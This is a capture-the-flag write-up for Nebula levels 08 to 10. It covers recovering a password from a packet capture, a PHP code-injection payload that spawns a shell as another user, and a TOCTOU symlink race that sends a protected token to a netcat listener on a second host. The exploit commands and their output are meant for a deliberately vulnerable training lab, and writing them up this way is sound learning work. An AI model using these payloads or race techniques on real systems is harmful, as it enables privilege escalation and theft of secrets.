## [Level 08](https://exploit.education/nebula/level-08/)

#### Solution
This sounds easy enough. Just go to `flag08` directory and see what kind of files are there.
At first, I felt intimidated by `root:root` access to `capture.pcap` file. However, it occured that the file allows to be read by anyone. In that case, we might be able to copy it and retrieve necessary information.

#### Result
After downloading `capture.pcap` I was able to open it with `wireshark`, where I've seen some tcp traffic. By selecting `Follow TCP` I've noticed that this is dump of someone's login attempts.

However, hex dump shows some more details

One can notice, that `x7f` equals to `backspace`. It probably means, that user pressed wrong key, and removed it.
After decyphering it, it seems to be `backd00Rmate`.
```
âžœ  ~ ssh flag08@nebula

```

## [Level 09](https://exploit.education/nebula/level-09/)

I couldn't crack this one, so I searched for solution over the internet. This one is explaining it very good: [Lucian Nitescu](https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-09/). Unfortunately, my php knowledge is not the best.

#### Solution
We need to use both `$filename` and `$use_me` variables. First one needs to contain payload, second will contain program name.

#### Result
```bash
level09@nebula:~$ cat exploit.php
[email {${system(sh)}}]
level09@nebula:~$ ~flag09/flag09 exploit.php .
PHP Notice:  Use of undefined constant sh - assumed 'sh' in /home/flag09/flag09.php(15) : regexp code on line 1
sh-4.2$ whoami
flag09
sh-4.2$ getflag
You have successfully executed getflag on a target account
sh-4.2$
```

Interesting that, when I replaced `sh` with `bash` it is not working:
```bash
PHP Notice:  Use of undefined constant bash - assumed 'bash' in /home/flag09/flag09.php(15) : regexp code on line 1
bash-4.2$ whoami
level09
bash-4.2$ getflag
getflag is executing on a non-flag account, this doesn't count
```

One can always provide `$use_me` variable too.

```bash
level09@nebula:~$ cat exploit.php
[email {${system($use_me)}}]
level09@nebula:~$ ~flag09/flag09 exploit.php getflag
You have successfully executed getflag on a target account
PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1

level09@nebula:~$ ~flag09/flag09 exploit.php sh
sh-4.2$ whoami
flag09
```

## [Level 10](https://exploit.education/nebula/level-10/)

TOCTOU == Time of Check, Time of Use

This is another one, where I spent significant amount of time. Even if I know how it suppose to work, I haven't been able to implement the solution correctly.

#### Solution
Time of Check, Time of Use means, that when program is running, it needs to verify an access to file, where we have an access. However, after doing that, we need to swap this file, with another one, which is unavailable to us.

#### Result
Nebula instance:
```bash
level10@nebula:~$ touch my_file
level10@nebula:~$ while true; do ln -sf /home/flag10/token token; ln -sf my_file token; done &
[1] 4467
level10@nebula:~$ while true; do /home/flag10/flag10 token debian; done
You don't have access to token
You don't have access to token
Connecting to debian:18211 .. Connected!
Sending file .. wrote file!
Connecting to debian:18211 .. Unable to connect to host debian
```

Second instance
```bash
dasm@debian:~$ nc -klp 18211 > received
dasm@debian:~$ cat received
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```

Nebula instance
```bash
level10@nebula:~$ su flag10
Password:  # use found token
sh-4.2$ getflag
You have successfully executed getflag on a target account
```
